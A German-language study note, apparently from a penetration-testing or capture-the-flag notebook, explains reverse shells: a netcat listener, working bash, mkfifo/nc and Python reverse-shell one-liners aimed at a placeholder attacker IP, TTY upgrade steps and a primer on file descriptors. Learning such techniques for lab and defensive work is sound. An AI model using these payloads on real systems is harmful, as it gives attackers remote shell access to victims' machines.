---
tags: [technique, foothold]
---
# Reverse Shell

> Das Opfer verbindet sich zu **dir** (umgeht eingehende Firewall-Regeln) und bringt seine Shell mit. [[netcat]] fängt sie auf.

## Ablauf
```bash
# Terminal 1 – Listener
nc -lvnp 4444
# Terminal 2 – Payload auf dem Opfer ausführen (eigene tun0-IP!)
```

## Payloads (eine klappt fast immer)
```bash
# bash (braucht echte bash)
bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'

# mkfifo + nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

## bash-Payload erklärt
| Teil                   | Bedeutung                               |
| ---------------------- | --------------------------------------- |
| `bash -c '...'`        | als bash ausführen (`/dev/tcp`-Feature) |
| `bash -i`              | interaktive Shell                       |
| `/dev/tcp/<IP>/<PORT>` | baut TCP-Verbindung zu mir              |
| `>&`                   | stdout(1)+stderr(2) → ins Netz          |
| `0>&1`                 | stdin(0) auch aus dem Netz              |
## Shell-Upgrade (TTY → `sudo` & Co. funktionieren)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # im Opfer
# Strg+Z
stty raw -echo; fg                                # auf Kali, dann 2x Enter
export TERM=xterm                                 # im Opfer
```
> Rohe `nc`-Shell hat kein TTY → kein `sudo`, kein Tab, `Strg+C` killt alles. Upgrade behebt das.

## Datei-Deskriptoren
|Nr.|Name|Bedeutung|Default|
|---|---|---|---|
|**0**|stdin|**Eingabe** – was reinkommt (Tastatur)|Tastatur|
|**1**|stdout|**normale Ausgabe** – das erwartete Ergebnis|Bildschirm|
|**2**|stderr|**Fehlerausgabe** – Fehlermeldungen/Warnungen|Bildschirm|
`>` heißt „leite diesen Kanal woandershin”. Die Zahl **davor** sagt, _welchen_ Kanal:
- `2>` → „leite **stderr** (Kanal 2) um”
- `1>` → „leite **stdout** (Kanal 1) um” (dasselbe wie nur `>`, weil 1 der Default ist)